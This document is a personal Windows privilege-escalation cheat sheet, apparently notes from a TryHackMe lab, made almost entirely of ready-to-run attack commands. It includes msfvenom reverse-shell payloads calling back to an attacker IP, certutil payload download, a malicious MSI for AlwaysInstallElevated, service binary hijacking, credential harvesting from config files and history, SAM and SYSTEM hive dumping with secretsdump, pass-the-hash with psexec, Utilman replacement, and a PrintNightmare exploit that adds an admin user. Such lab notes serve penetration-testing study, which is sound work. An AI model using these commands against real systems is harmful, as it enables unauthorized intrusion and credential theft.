[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
[Other links](https://tryhackme.com/r/room/windowsprivesc20#header-9)

---
### Basics

**Connect to windows via xFreeRDP**
```shell
xfreerdp /u:[user] /p:[password] /v:[server] /dynamic-resolution /cert:ignore +clipboard /drive:share,/rdp
```

**RDP through TLS**
```shell
xfreerdp /u:[user] /p:[password] /v:[server] /dynamic-resolution /cert:ignore +clipboard /drive:share,/rdp /sec:tls
```

**Set belgian french keyboard**
```powershell
Set-WinUserLanguageList -LanguageList "fr-BE" -Force
```

**Load an administrator shell**
```Powershell
Start-Process powershell 'Start-Process powershell -Verb RunAs' -Credential [admin]
```

**Start powershell in cmd**
```powershell
powershell -ep bypass
```
##### Shells
**Classic reverse shell**
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.79.56 LPORT=9001 -f exe -o shell.exe
```

**Meterpreter shell**
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.79.56 LPORT=9002 -f exe -o shell.exe
```

**Setup meterpreter listener**
```shell
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.14.79.56
set LPORT 9002
exploit
```

**Transfer the shell**
```powershell
certutil -urlcache -split -f "http://10.14.79.56:5050/shell.exe" C:\Users\Public\shell.exe
```

**Execute the shell**
```powershell
C:\Users\Public\shell.exe
```

**Some meterpreter commands**
`help`
`getsystem` : Attempt to elevate your privilege to that of local system
`hashdump`: Dumps the contents of the SAM database
`upload` : Upload a file or directory
`download` : Download a file or directory
### Enumeration
[Seatbelt](https://github.com/GhostPack/Seatbelt)

**Get WinPEAS**
```shell
wget "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -O winPEAS.exe
```


### Harvesting Passwords from Usual Spots

##### Unattended Windows installations locations
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

##### Powershell History
**On powershell.exe**
```Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
**On cmd.exe**
```Powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

##### Saved Windows credentials
```Powershell
cmdkey /list
```
![[Screenshot_2024-07-21_11-02-30.png]]
```Powershell
runas /savecred /user:mike.katz cmd.exe
```

##### IIS Configuration
**Locations**
- C:/inetpub/wwwroot/web.config
- C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web.config

```Powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

##### Credentials from PuTTY
```Powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
<small>SimonTatham is not a user, it is the creator of PuTTY</small>

### Schedule Tasks
**List a task by name (vulntask)**
```Powershell
schtasks /query /tn vulntask /fo list /v
```
![[Screenshot_2024-07-21_11-34-58.png]]
Check permissions on the task file and modify it if possible
**Run the task**
```Powershell
schtasks /run /tn vulntask
```

### AlwaysInstallElevated
**Check the regs**
```Powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Both need to be set to exploit
**Create the malware**
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[host] LPORT=[port] -f msi -o malicious.msi
```
**Run the malware**
```Powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Abusing Service Misconfigurations
##### Windows services
**Check service configuration**
```Powershell
sc qc apphostsvc
```

**Registry location**
```text
HKLM\SYSTEM\CurrentControlSet\Services\
```
##### Insecure permissions on Service Executable
_**Example**_
**Check Windows Scheduler service**
```Powershell
sc qc WindowsScheduler
```
![[Screenshot_2024-07-21_12-11-56.png]]
**Check permission on binary**
```Powershell
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
![[Screenshot_2024-07-21_12-13-06.png]]
If you can modify the binary, replace it by a reverse shell
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[host] LPORT=[port] -f exe-service -o WService.exe
```
**Give permission on the reverse shell**
```Powershell
icacls WService.exe /grant Everyone:F 
```
**Restart the service to trigger the reverse shell**
```Powershell
sc stop windowsscheduler
sc start windowsscheduler
```

##### Unquoted Service paths
_**Example**_
![[Screenshot_2024-07-21_12-43-24.png]]
The `BINARY_PATH_NAME` is unquoted, which means that Windows will try to execute `C:\MyPrograms\Disk.exe` first, then `C:\MyPrograms\Disk Sorter.exe` and finally the intended binary. If we have the permissions to write in `C:\MyPrograms`, we could place a reverse shell as `Disk.exe`
**Create the binary**
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[host] LPORT=[port] -f exe-service -o Disk.exe
```

##### Insecure Service permissions
**Check service permission**
Using `Accesschk` from Sysinternals suite
```Powershell
accesschk64.exe -qlc thmservice
```
![[Screenshot_2024-07-21_12-57-00.png]]
This means that `BUILTIN\Users` has `SERVICE_ALL_ACCESS` permissions <small>(thx sherlock)</small>
**Put the binary somewhere**
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[host] LPORT=[port] -f exe-service -o revshell.exe
```
**Reconfigure the binary path for the service**
```Powershell
sc config THMService binPath="C:\Users\thm-unpriv\Desktop\revshell.exe" obj=LocalSystem
```
**Restart the service to trigger the reverse shell**
```Powershell
sc stop THMService
sc start THMService
```

### Abusing dangerous privileges
[List of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
[Escalation]([List of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants))
**Check privileges**
Run the `cmd.exe` as Administrator to get the complete privileges of the user
```powershell
whoami /priv
```

##### SeBackup / SeRestore
**Backup SAM and SYSTEM hive**
```powershell
reg save hklm\system \\tsclient\share\system.hive
reg save hklm\sam \\tsclient\share\sam.hive
```
<small>\\tsclient\share is the rdp shared directory</small>
**Dump credentials with [secretdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)**
```shell
python3 secretdump.py -sam /rdp/sam.hive -system /rdp/system.hive LOCAL
```

**Use the hashes to get SYSTEM console with [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)**
```shell
python3 psexec.py -hashes [hash] administrator@[target-ip]
```
##### SeTakeOwnership
**Get owner of a file**
```powershell
 Get-Acl "C:\Windows\System32\Utilman.exe" | Select-Object -ExpandProperty Owner
 ```
**Become the owner of this file**
```powershell
takeown /f "C:\Windows\System32\Utilman.exe"
```
**Grant Full permission on me**
```powershell
icacls "C:\Windows\System32\Utilman.exe" /grant THMTakeOwnership:F 
```
**Replace by cmd**
```powershell
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Utilman.exe"
```

##### SeImpersonate / SeAssignPrimaryToken
[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

### Abusing vulnerable software


### CVEs

#### PrintNightmare - <small>Server 2016/2019</small>
[CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)
```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```

